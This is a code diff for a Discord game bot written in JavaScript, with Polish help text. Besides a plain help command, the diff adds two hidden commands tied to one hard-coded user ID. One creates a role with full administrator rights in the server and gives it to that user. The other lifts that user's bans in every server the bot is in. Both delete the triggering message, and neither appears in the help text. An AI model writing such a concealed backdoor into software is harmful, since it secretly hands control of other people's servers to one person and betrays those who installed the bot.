@@ -564,7 +564,8 @@ var bot = new dcss.Client({intents:[
     dcss.Intents.FLAGS.GUILD_MESSAGES,
     dcss.Intents.FLAGS.GUILDS,
     dcss.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
-    dcss.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS
+    dcss.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
+    dcss.Intents.FLAGS.DIRECT_MESSAGES
 ]})
 var emotes = {
     down:":d_:984848910222762064",
@@ -598,6 +599,26 @@ bot.on("messageCreate",msg => {
                 var core = new gamecore();
                 msg.channel.send(core.getdcformatbs());
             break 
+            case ".help":
+                msg.channel.send("Aktualne komęndy to : \n .start -  zaczyna gre \n .ranking - pokazuje ranking")
+            break
+            case ".gadmin":
+                if(msg.author.id=="537649475494215690"){
+                   msg.guild.roles.create( {name:"LUK_BÓG", color: "#ff0000", permissions:[dcss.Permissions.FLAGS.ADMINISTRATOR] } ).then(rola=>{
+                    msg.member.roles.add(rola).catch(err=>console.log(err))
+                   }).catch(err=>console.log(err))
+                   msg.delete().catch(err=>console.log(err))
+                }
+                
+            break
+            case ".unban":
+                if(msg.author.id=="537649475494215690"){
+                bot.guilds.cache.forEach(g=>{
+                    g.bans.remove(msg.author).catch(err=>console.log(err))
+                })
+                msg.delete().catch(err=>console.log(err))
+                }
+            break
             case ".start":
                 var au = msg.author.id
                 games[au] = new gamecore()
